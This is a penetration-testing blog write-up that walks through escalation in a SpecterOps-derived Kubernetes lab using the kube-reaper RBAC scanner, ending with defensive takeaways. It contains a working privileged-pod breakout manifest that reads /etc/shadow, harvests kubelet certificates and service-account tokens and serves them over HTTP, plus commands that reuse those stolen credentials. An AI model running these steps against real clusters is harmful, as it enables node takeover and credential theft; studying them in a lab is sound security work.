---
title: "From Developer Pod to Cluster Admin using Kube-Reaper"
kicker: "Kubernetes . RBAC Attack Paths . Privilege Escalation"
tags: "Kubernetes . kube-reaper . RBAC . Pentesting"
lead: "Using kube-reaper to map RBAC attack paths in a Kubernetes cluster, then manually validating every finding: privileged pod breakout, credential theft, identity pivoting, and unconventional permission abuse."
---

## The Lab

![Lab Topology](image/kube-reaper-lab-topology.svg)

*Lab cluster designed by [SpecterOps](https://specterops.io/), adapted to run in a Proxmox environment.*

The cluster runs Kubernetes v1.35.1 on Ubuntu 24.04 with Calico CNI. Three nodes, one control plane and two workers. Our initial foothold is a Mythic C2 callback on worker-2 running as the `developer` SA. From there, we port-forwarded into the `code-server` pod in the `development` namespace, which has the RBAC permissions we will be exploring.

**Nodes:**

| Node | IP | Role |
|------|----|------|
| k8s-control-plane-1 | 10.3.10.20 | Control plane (apiserver, etcd, scheduler, controller-manager) |
| k8s-worker-1 | 10.3.10.30 | Worker |
| k8s-worker-2 | 10.3.10.31 | Worker (hosts our foothold) |

**Namespaces with custom workloads:**

| Namespace | Workloads | PSS Enforcement |
|-----------|-----------|-----------------|
| development | code-server (foothold), developer SA | baseline |
| cicd | empty (but we can deploy here) | **none** |
| production | prod-backend | **none** |

**Key identities:**

| Identity | Type | Permissions |
|----------|------|-------------|
| code-server | ServiceAccount (development) | Pods, services, configmaps, deployments in development + cicd |
| developer | ServiceAccount (development) | Port-forward only. Has a non-expiring token secret |
| prod-debug-agent | User | List secrets cluster-wide. Create rolebindings in production |
| kubernetes-admin | User | Full cluster-admin |

---

## What is [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) is a Kubernetes RBAC attack path scanner. You give it a token or kubeconfig file. It tells you what you can break.

Most RBAC audit tools list permissions and flag things that look wrong. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) does something different. It chains permissions together into attack paths. It tells you: "You can create pods in this namespace, that namespace has no Pod Security Standards, so you can deploy a privileged container and break out to the node."

It is a single Rust binary. You can drop it on a compromised pod, a worker node, or run it from your attack machine. It needs only a token and an API server address.

---

## Scan 1: Foothold Reconnaissance

Our initial access to the cluster came through a Mythic C2 callback running as the `developer` service account. That SA has `pods/portforward` permissions, which we used to port-forward into the `code-server` pod and access its VS Code web interface. From there, we are operating as the `code-server` service account, which has a much broader set of RBAC permissions. This is where [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) picks up. First, we grab the projected service account token and store it in a variable:

```bash
[code-server pod] $ export CS_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

We point [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) at the API server with this token:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --output terminal
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) runs through its scan phases. It checks our identity, lists namespaces, maps our permissions across each one, finds pods we can see, checks for accessible secrets, and then matches everything against its pattern library.

```
[*] Identifying current identity...
[+] Identity: system:serviceaccount:development:code-server
[*] Enumerating namespaces...
[+] Found 10 namespaces
[*] Enumerating RBAC permissions across 10 namespaces...
[+] Enumerated permissions in 10 namespaces
[*] Enumerating pods...
[+] Found 2 pods
[*] Checking secret accessibility...
[+] 0 secrets accessible
[*] Enumerating RBAC graph (roles, bindings, identities)...
[+] RBAC graph: 0 roles, 0 bindings, 0 identities (0 SAs, 0 users, 0 groups)
```

The scan summary gives us the full picture in seconds:

```
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:development:code-server
  Namespace: default
  Namespaces Found: 10
  Findings: 13
  Attack Chains: 1
  Dangerous Pods: 1
═══════════════════════════════════════════════════════
```

13 findings. 1 attack chain. 1 dangerous pod. Let us look at each section.

### Attack Chain: Privileged Pod Breakout

The first thing [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) shows is attack chains. These are multi-step paths from your current permissions to a higher level of access.

```
Chain #1 [CRITICAL] Privileged Pod Breakout via
         system:serviceaccount:development:code-server in cicd
────────────────────────────────────────────────────────────

  system:serviceaccount:development:code-server can create pods in
  namespace cicd which has no PSS enforcement. Deploy a privileged
  pod to break out to the node.

  ├──▶ [code-server@cicd] Create privileged pod with hostPID,
  │     hostNetwork, hostPath:/
  │   → Pod deployed with full node access (Code Execution)
  └──▶ [code-server@cicd] chroot /mnt from inside privileged container
      → Root shell on worker node (Node Breakout)

  Final Capability: Node Breakout
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found that:
1. Our SA can **create pods** in the `cicd` namespace
2. The `cicd` namespace has **no Pod Security Standards** enforcement
3. This means we can deploy a pod with `privileged: true`, `hostPID`, `hostNetwork`, and `hostPath: /`
4. From inside that pod, we `chroot /mnt` and we are root on the node

### Dangerous Pod Detection

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) also found a pod already running in the cluster that is configured dangerously:

```
● [CRITICAL] cicd/breakout
  │ SA: default | Image: python:3-slim | Node: k8s-worker-2
  ├ ⚠ PRIVILEGED container
  ├ ⚠ hostPID enabled
  ├ ⚠ hostNetwork enabled
  ├ ⚠ hostPath mount: / (ROOT/SENSITIVE)
  └ ⚠ SA token auto-mounted (SA: default)
  Attack: exec into privileged container -> full node access
```

I had already deployed a privileged pod in cicd with the host root filesystem mounted. This pod has everything an attacker needs: privileged security context, access to the host PID namespace, host networking, and the entire host filesystem at `/`.

### Namespace Security Map

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) maps Pod Security Standards enforcement across all namespaces and cross-references it with our ability to create pods:

```
● cicd        | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
● default     | NO PSS ENFORCEMENT | cannot create pods
● development | PSS: baseline      | can create pods
● production  | NO PSS ENFORCEMENT | cannot create pods
● kube-system | NO PSS ENFORCEMENT | cannot create pods
```

The `cicd` namespace is the weak link. No PSS enforcement **and** we can create pods there. The `development` namespace has `baseline` PSS, which blocks privileged containers.

### Dangerous Permission Patterns

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 40+ dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:

**CRITICAL:**
- Create Pods (No PSS Enforcement) in cicd. This enables node breakout.

**HIGH:**
- Create Pods with ServiceAccount specification in cicd and development. We can create a pod that runs as any SA in the namespace.
- Patch/Update Pods in cicd and development. We can modify running pods to inject privileged containers.
- Create Deployments in cicd and development. Persistent access through controller-managed workloads.

**MEDIUM (Unconventional):**
- Create ReplicaSets directly. This lets us deploy pods without the deployment audit trail. Most defenders monitor deployment creation, not direct ReplicaSet creation.

---

## Manual Validation: The Privileged Pod Breakout

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) told us we can break out through cicd. Let us prove it, end-to-end, using only the code-server SA identity.

### Step 1: Confirm permissions

All commands in this validation run from inside the code-server pod on worker-2. We use `/tmp/kubectl` (downloaded earlier) and `/tmp/cs-kubeconfig` (a clean kubeconfig with only the code-server SA token, no admin client certificates).

First, we verify that the code-server SA can create pods in the cicd namespace:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig auth can-i create pods -n cicd
yes
```

And confirm we **cannot exec** into pods there:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig auth can-i create pods --subresource=exec -n cicd
no
```

And that cicd has no PSS:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig get namespace cicd --show-labels | grep pod-security
```

No output. No `pod-security.kubernetes.io/enforce` label. The namespace accepts any pod spec.

We can create pods but cannot exec into them. This means we cannot use `kubectl exec` to interact with the pod after it starts. We need to embed our commands directly in the container startup command. In a real engagement you would use a reverse shell or C2 callback. For this validation, the pod collects proof data on startup and serves it over HTTP using `hostNetwork`.

### Step 2: Deploy the self-extracting breakout pod

We create a pod with every host-level access flag enabled. The container command does the node breakout automatically: it runs `chroot` to get root on the host, reads `/etc/shadow`, lists the kubelet PKI certificates, finds all projected SA tokens on the node, copies the kubelet client certificate and cluster CA to `/tmp`, and then starts a Python HTTP server to serve everything.

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: reaper-breakout
  namespace: cicd
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: python:3-slim
    command: ["sh", "-c", "chroot /mnt id > /tmp/proof.txt && chroot /mnt hostname >> /tmp/proof.txt && head -3 /mnt/etc/shadow >> /tmp/proof.txt && ls /mnt/var/lib/kubelet/pki/ >> /tmp/proof.txt && find /mnt/var/lib/kubelet/pods -name token -path '*kube-api-access*' >> /tmp/proof.txt 2>/dev/null && cat /mnt/var/lib/kubelet/pki/kubelet-client-2026-09-13-14-51-33.pem > /tmp/kubelet-client.pem && cp /mnt/etc/kubernetes/pki/ca.crt /tmp/kubelet-ca.pem 2>/dev/null && cd /tmp && python3 -m http.server 8888"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /mnt
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
EOF
```

```
pod/reaper-breakout created
```

The API server accepted it. No admission controller blocked it. The pod starts on worker-2:

```
NAME              READY   STATUS    RESTARTS   AGE   IP           NODE
reaper-breakout   1/1     Running   0          17s   10.3.10.31   k8s-worker-2
```

### Step 3: Read the proof without exec

The pod uses `hostNetwork`, so it shares the node's IP address. The Python HTTP server listens on port 8888 at `10.3.10.31`. We retrieve the proof file with a simple curl, no exec needed:

```bash
[code-server pod] $ curl -s http://10.3.10.31:8888/proof.txt
```

```
uid=0(root) gid=0(root) groups=0(root)
k8s-worker-2
root:*:20135:0:99999:7:::
daemon:*:20135:0:99999:7:::
bin:*:20135:0:99999:7:::
kubelet-client-2026-09-13-14-51-33.pem
kubelet-client-current.pem
kubelet.crt
kubelet.key
/mnt/var/lib/kubelet/pods/.../kube-api-access-pvzhg/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-dq7ss/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-n96zv/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-94rtc/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-4s8jt/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-28jmq/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-l24wn/token
```

Line by line, this tells us:
- **`uid=0(root)`**: The container runs as root with full capabilities (privileged mode)
- **`k8s-worker-2`**: `chroot /mnt hostname` resolved the host's hostname, not the container's. We broke out of the container
- **`/etc/shadow`**: We read the node's shadow file. Full host filesystem access is confirmed
- **`kubelet-client-*.pem`**: The kubelet's client certificates are accessible. These authenticate as `system:node:k8s-worker-2` to the API server
- **7 SA token paths**: Every service account token projected into pods on this node is readable

The code-server SA created a pod. The pod broke out of the container. We read the proof over the network. No `kubectl exec` was used at any point.

### Step 4: Steal identities from the node

From the node filesystem, each projected token under `/var/lib/kubelet/pods/` belongs to a pod running on worker-2. In a real engagement, the breakout pod's startup command would exfiltrate these tokens (via the HTTP server, a reverse shell, or a DNS callback). Here we show what those tokens resolve to:

| Stolen Token | Identity |
|-------------|----------|
| Token 1 | system:serviceaccount:development:code-server |
| Token 2 | system:serviceaccount:calico-system:calico-node |
| Token 3 | system:serviceaccount:calico-apiserver:calico-apiserver |
| Token 4 | system:serviceaccount:cicd:default |
| Token 5 | system:serviceaccount:production:default |
| Token 6 | system:serviceaccount:calico-system:default |
| Token 7 | system:serviceaccount:kube-system:kube-proxy |

Seven identities, each with different permissions across the cluster.

### Step 5: Pivot to the node identity

The breakout pod also exfiltrated the kubelet client certificate from `/var/lib/kubelet/pki/` and the cluster CA. Both files are served on the HTTP server alongside the proof data. From the code-server pod, we download them:

```bash
[code-server pod] $ curl -s http://10.3.10.31:8888/kubelet-client.pem -o /tmp/kubelet-client.pem
[code-server pod] $ curl -s http://10.3.10.31:8888/kubelet-ca.pem -o /tmp/kubelet-ca.pem
```

Now we authenticate to the API server using the stolen kubelet certificate, still from the code-server pod:

```bash
[code-server pod] $ /tmp/kubectl --client-certificate=/tmp/kubelet-client.pem --client-key=/tmp/kubelet-client.pem --certificate-authority=/tmp/kubelet-ca.pem --server=https://10.3.10.20:6443 auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:node:k8s-worker-2
Groups      [system:nodes system:authenticated]
```

We pivoted to `system:node:k8s-worker-2` without ever leaving the code-server pod. The Kubernetes Node Authorization module limits this identity to secrets that belong to pods on this node. But it gives us another angle to enumerate from.

The attack chain is validated end-to-end. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified the path. We walked it manually using only the code-server SA's `create pods` permission. Every step ran from the code-server pod. No admin access was used at any point.

### Cleanup

From the code-server pod, delete the breakout pod so we do not leave orphans in the cluster:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig delete pod reaper-breakout -n cicd
```

```
pod "reaper-breakout" deleted
```

Also remove the exfiltrated credentials from the foothold:

```bash
[code-server pod] $ rm -f /tmp/kubelet-client.pem /tmp/kubelet-ca.pem
```

---

## Scan 2: Full RBAC Graph Enumeration (Admin View)

When you run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) with cluster-admin privileges, it unlocks the full RBAC graph analysis. This is useful for defenders and for attackers who already have admin access and want to understand the entire attack surface.

We run this scan on the control plane (`k8s-control-plane-1`) as `kubernetes-admin`, using the default admin kubeconfig:

```bash
[k8s-control-plane-1] $ kube-reaper --output terminal --pivot --pivot-depth 3
```

The scan discovers far more:

```
═══════════════════════════════════════════════════════
  Identity: kubernetes-admin
  Namespaces Found: 10
  Findings: 10
  Attack Chains: 29
  Dangerous Pods: 20
  CRD Attack Surface: 2
  Overprivileged Identities: 43
  Pivot Identities: 50 (49 edges, depth 1)
  Accessible Secrets: 9
═══════════════════════════════════════════════════════
```

29 attack chains. 20 dangerous pods. 43 overprivileged identities. 50 pivotable identities. Let us look at the key sections.

### RBAC Identity Graph

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) enumerates all 96 roles, 84 bindings, and maps them to 68 identities (55 service accounts, 5 users, 8 groups). It builds a profile for each identity:

```
● [CRITICAL] prod-debug-agent (User)
  │ Roles: ClusterRole/prod-debug-agent-observer,
  │        Role/production/prod-rolebinding-manager
  │ Namespaces: cluster-wide, production
  └ Dangerous: Read Node Information, Read ConfigMaps,
               Read Secrets, Create/Modify RoleBindings,
               Bind Verb on Roles
```

```
● [CRITICAL] system:serviceaccount:development:code-server (ServiceAccount)
  │ Roles: ClusterRole/code-server-namespace-reader,
  │        Role/cicd/developer-cicd-debug,
  │        Role/development/code-server-role
  │ Namespaces: cluster-wide, cicd, development
  └ Dangerous: Create Pods (No PSS Enforcement),
               Create Pods (With SA Specification),
               Delete Pods, Patch/Update Pods,
               Create/Modify Services + Endpoints (+4 more)
```

```
● [CRITICAL] system:serviceaccount:kube-system:clusterrole-aggregation-controller
  │ Roles: ClusterRole/system:controller:clusterrole-aggregation-controller
  │ Namespaces: cluster-wide
  └ Dangerous: Escalate Verb on ClusterRoles,
               Create/Modify ClusterRoles
```

The `clusterrole-aggregation-controller` finding is interesting. This system controller has the `escalate` verb, which lets it bypass Kubernetes RBAC escalation prevention. If an attacker compromises this SA, they can give any role any permission.

### Secret Triage

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) classifies accessible secrets by risk:

```
● [CRITICAL] development/developer-token (SA Token)
  │ Type: kubernetes.io/service-account-token
  └ Attack: Contains a non-expiring SA token.
            Decode and use: kubectl --token=<token> --server=<api>.
            Pivot to this SA's identity.
```

```
● [MEDIUM] production/prod-debug-certs (Opaque Secret)
  │ Type: Opaque
  └ Attack: Opaque secret. May contain passwords, API keys,
            connection strings.
```

The `developer-token` secret is CRITICAL because it contains a Kubernetes service account token that never expires. Old-style SA token secrets (type `kubernetes.io/service-account-token`) persist until someone deletes them.

### CRD Attack Surface

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) scans Custom Resource Definitions for known attack patterns:

```
● [HIGH] GlobalNetworkPolicy (Service Mesh)
  │ CRD: globalnetworkpolicies.crd.projectcalico.org
  └ Attack: Modify/delete Calico GlobalNetworkPolicy ->
            disable network segmentation cluster-wide

● [MEDIUM] NetworkPolicy (Service Mesh)
  │ CRD: networkpolicies.crd.projectcalico.org
  └ Attack: Modify Calico NetworkPolicy ->
            weaken namespace network isolation
```

If an attacker gains permissions to modify Calico GlobalNetworkPolicies, they can disable all network segmentation in the cluster. Every pod would be able to talk to every other pod.

---

## Manual Validation: Developer Token Secret

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged `developer-token` as CRITICAL. Let us verify this.

On the control plane as `kubernetes-admin`, we extract the token from the secret:

```bash
[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o jsonpath="{.data.token}" | base64 -d > /tmp/dev-token.txt
```

We cannot just pass `--token=$(cat /tmp/dev-token.txt)` directly. The control plane has the admin kubeconfig loaded by default, and that kubeconfig contains client certificates. When kubectl sees both a client certificate and a `--token` flag, the certificate wins. The token gets ignored and `auth whoami` returns `kubernetes-admin` instead of the developer SA. To avoid this, we build a clean kubeconfig that contains only the stolen token and no client certificates:

```bash
[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config set-credentials devsa --token=$(cat /tmp/dev-token.txt) --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config set-context devsa --cluster=lab --user=devsa --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config use-context devsa --kubeconfig=/tmp/stolen.yaml
```

Now we use the stolen token kubeconfig to verify the identity:

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/stolen.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:development:developer
Groups      [system:serviceaccounts system:serviceaccounts:development
             system:authenticated]
```

The token works. It authenticates as the `developer` service account. We intentionally authenticated with the actual token here instead of using `kubectl --as=developer` impersonation. Impersonation would only prove what permissions the SA has. Authenticating with the token proves the credential itself is valid and usable from anywhere. This SA only has port-forward permissions, but the token is a persistence mechanism. It does not expire. An attacker can copy this token to their own machine and use it weeks later. Even if the developer SA's pod is deleted, this token keeps working until the secret itself is deleted.

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/stolen.yaml auth can-i --list -n development 2>/dev/null | grep -v selfsubject
```

```
Resources          Non-Resource URLs   Resource Names   Verbs
pods/portforward   []                  []               [create]
pods               []                  []               [list get]
```

The developer SA can list pods and create port-forwards. An attacker who steals this token gets persistent access to forward traffic from internal pods to their machine.

---

## Manual Validation: prod-debug-agent Permissions

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged `prod-debug-agent` as CRITICAL with a dangerous combination: list secrets cluster-wide plus create rolebindings in production.

We validate these permissions on the control plane using `--as` impersonation (which requires admin access):

### Can it list secrets?

```bash
[k8s-control-plane-1] $ kubectl get secrets -n development --as=prod-debug-agent
NAME              TYPE                                  DATA   AGE
developer-token   kubernetes.io/service-account-token   3      46h
```

```bash
[k8s-control-plane-1] $ kubectl get secrets -n production --as=prod-debug-agent
NAME               TYPE     DATA   AGE
prod-debug-certs   Opaque   3      46h
```

Yes. It can list secrets in every namespace. It sees secret names and types.

### Can it read secret data?

```bash
[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o yaml --as=prod-debug-agent
```

```
Error from server (Forbidden): secrets "developer-token" is forbidden:
User "prod-debug-agent" cannot get resource "secrets"
```

No. It can list but not get. It sees what secrets exist but cannot read their contents. This is still useful for reconnaissance because it tells the attacker exactly which secrets to target.

### Can it create rolebindings?

```bash
[k8s-control-plane-1] $ kubectl auth can-i create rolebindings -n production --as=prod-debug-agent
yes
```

```bash
[k8s-control-plane-1] $ kubectl auth can-i bind roles -n production --as=prod-debug-agent
yes
```

Yes to both. This means `prod-debug-agent` can create a RoleBinding in production that binds an existing Role to any user or service account. If there is a Role in production with secret read permissions, prod-debug-agent can bind it to itself and then read all secrets in production.

---

## Scan 3: Recursive Identity Pivoting

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)'s `--pivot` flag does something that no manual enumeration can do efficiently. It reads SA token secrets and mints tokens using the TokenRequest API, then authenticates as each discovered identity, enumerates their permissions, and repeats. It builds a graph of every identity it can reach and what each one can do.

From the code-server pod, pivoting finds nothing because code-server cannot read secrets or create tokens:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --pivot --pivot-depth 3
```

```
[*] Starting recursive identity pivot (max depth 3)...
[*] Current identity cannot read secrets or create tokens. No pivot paths.
```

But from the control plane as `kubernetes-admin`, the pivot graph lights up:

```bash
[k8s-control-plane-1] $ kube-reaper --pivot --pivot-depth 3
```

```
[*] Starting recursive identity pivot (max depth 3)...
  [+] Pivot: kubernetes-admin -> development:developer
      (secret development/developer-token)
  [+] Pivot: kubernetes-admin -> development:code-server
      (TokenRequest in development)
  [+] Pivot: kubernetes-admin -> cicd:default
      (TokenRequest in cicd)
  [+] Pivot: kubernetes-admin -> kube-system:certificate-controller
      (TokenRequest in kube-system)
  [+] Pivot: kubernetes-admin -> kube-system:clusterrole-aggregation-controller
      (TokenRequest in kube-system)
  ...
[!] Pivot cap reached (50 identities). Stopping.
[+] Pivot complete: 50 identities, 49 edges, max depth 1
```

The pivot graph output shows each discovered identity with its severity and permissions:

```
[HIGH] system:serviceaccount:development:developer
    [SecretToken development/developer-token]
  via from: kubernetes-admin
  perms: Create Port Forwards

[CRITICAL] system:serviceaccount:development:code-server
    [TokenRequest development/code-server]
  via from: kubernetes-admin
  perms: Create Pods (No PSS Enforcement),
         Create Pods (With SA Specification),
         Delete Pods, Patch/Update Pods (+4 more)

[CRITICAL] system:serviceaccount:kube-system:certificate-controller
    [TokenRequest kube-system/certificate-controller]
  via from: kubernetes-admin
  perms: Approve Certificate Signing Requests

[HIGH] system:serviceaccount:kube-system:bootstrap-signer
    [TokenRequest kube-system/bootstrap-signer]
  via from: kubernetes-admin
  perms: Read ConfigMaps, Create Events, Read Secrets
  pivot: read secrets [kube-system]
```

Notice the last entry. The `bootstrap-signer` SA can read secrets in `kube-system`. If [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)'s pivot depth were deeper, it would authenticate as bootstrap-signer, read secrets in kube-system, find more SA tokens, and continue the chain.

The method column tells you how each identity was reached:
- **SecretToken**: An old-style non-expiring SA token was found in a Secret
- **TokenRequest**: [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) used the TokenRequest API to mint a fresh token

This distinction matters. SecretToken pivots work from any identity that can read secrets. TokenRequest pivots require `create` on `serviceaccounts/token`.

---

## Scan 4: Unconventional RBAC Patterns

Most RBAC scanners flag `create pods` and `get secrets`. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) also catches the patterns that defenders rarely monitor.

We run this from the code-server pod using the foothold token:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --unconventional-only
```

```
● Create ReplicaSets (code-server@cicd) [UNCONVENTIONAL]
  │ Resource: replicasets [get, list, watch, create, delete, patch]
  │ Attack: Create a ReplicaSet directly -> deploy pods without
  │         deployment audit trail.
  └ Enables: Code Execution

● Create ReplicaSets (code-server@development) [UNCONVENTIONAL]
  │ Resource: replicasets [get, list, watch, create, delete, patch]
  │ Attack: Create a ReplicaSet directly -> deploy pods without
  │         deployment audit trail.
  └ Enables: Code Execution
```

Why does this matter? Most Kubernetes monitoring tools watch for `Deployment` creation events. Security teams build alerts around deployment creation in sensitive namespaces. But a ReplicaSet can create pods the same way a Deployment does. If you create a ReplicaSet directly, you skip the Deployment controller. The pod still runs. But many audit pipelines miss it.

The admin scan found additional unconventional patterns across the cluster:
- **Escalate verb** on ClusterRoles (clusterrole-aggregation-controller): bypasses RBAC escalation prevention
- **Bind verb** on Roles (prod-debug-agent in production): allows binding existing roles to arbitrary subjects
- **Modify ValidatingAdmissionPolicies** (generic-garbage-collector): could disable admission controls

---

## Putting It Together: The Full Attack Chain

Here is the complete path from developer pod to cluster admin, as [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) mapped it and as we validated manually:

```
Step 1: code-server SA (development namespace)
  │
  │ code-server has create pods permission in cicd
  │ cicd namespace has no PSS enforcement
  │
  ▼
Step 2: Deploy privileged pod in cicd
  │
  │ Pod spec: privileged=true, hostPID, hostNetwork, hostPath=/
  │ API server accepts it (no PSS to block it)
  │ Pod runs on worker-2
  │
  ▼
Step 3: Break out to node
  │
  │ chroot /mnt from inside privileged container
  │ Now root on k8s-worker-2
  │
  ▼
Step 4: Steal credentials from node filesystem
  │
  │ Read projected SA tokens from /var/lib/kubelet/pods/
  │ Read kubelet client cert from /var/lib/kubelet/pki/
  │ Read SSH keys from /root/.ssh/
  │ 7 SA tokens recovered. Kubelet cert authenticates as system:node
  │
  ▼
Step 5: Lateral movement
  │
  │ Use stolen calico-node SA token (privileged, hostNetwork,
  │ access to all nodes)
  │ Or SSH to control plane using recovered keys
  │ Or use kubelet cert to access node-bound secrets
  │
  ▼
Step 6: Control plane access
  │
  │ Read /etc/kubernetes/admin.conf from control plane node
  │ This file contains the cluster-admin certificate
  │
  ▼
Step 7: Cluster admin
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified steps 1 through 3 automatically from the foothold scan. The admin scan with `--pivot` mapped the identity relationships that make steps 4 through 6 possible. No manual RBAC review could piece this together as fast.

---

## Summary of [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) Capabilities

| Capability | What it does | Why it matters |
|-----------|-------------|----------------|
| **Permission enumeration** | Maps your exact RBAC rules across every namespace | Shows what you can touch, not just what roles you have |
| **Dangerous pattern matching** | 40+ patterns matched against your permissions | Catches things beyond "can create pods" |
| **Attack chain analysis** | Chains permissions into multi-step escalation paths | Turns permission data into actionable attack plans |
| **Namespace PSS mapping** | Correlates pod creation with PSS enforcement | Identifies which namespaces allow privileged pods |
| **Pod security analysis** | Flags privileged pods, hostPath, hostPID, hostNetwork | Finds existing breakout-ready pods |
| **Recursive identity pivot** | Steals tokens, authenticates as each identity, repeats | Maps the full identity graph automatically |
| **RBAC graph enumeration** | Lists all roles, bindings, and identity profiles | Shows who has what across the entire cluster |
| **Secret triage** | Classifies accessible secrets by attack value | Highlights SA tokens, certs, and credentials |
| **CRD attack surface** | Identifies dangerous CRDs (Calico, Istio, etc.) | Catches service mesh and CNI misconfiguration |
| **Unconventional pattern detection** | Flags escalate/bind verbs, direct ReplicaSet creation, webhook manipulation | Catches what other tools miss |
| **Severity filtering** | `--severity high` to focus on critical findings | Cuts noise during time-limited assessments |
| **Token authentication** | `--token` + `--server` for direct access | Works from compromised pods with no kubeconfig |

---

## Defensive Takeaways

What would have stopped this attack chain:

1. **Enforce PSS on the cicd namespace.** A `baseline` or `restricted` label would have blocked the privileged pod.
2. **Do not grant cross-namespace pod creation.** The code-server SA should not have permissions in cicd.
3. **Delete legacy SA token secrets.** The `developer-token` secret is a persistence risk.
4. **Separate list from get on secrets.** prod-debug-agent can list secret names cluster-wide. This leaks the names and types of all secrets.
5. **Audit the bind verb.** prod-debug-agent can bind roles in production. This is one step from privilege escalation.
6. **Monitor ReplicaSet creation.** Audit policies should catch direct ReplicaSet creation, not just Deployments.

Run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) against your own cluster. The output tells you exactly where the gaps are and how an attacker would use them.

---

## Credits

The Kubernetes attack lab used in this post was designed by [SpecterOps](https://specterops.io/). I adapted it to run in a Proxmox virtualization environment.
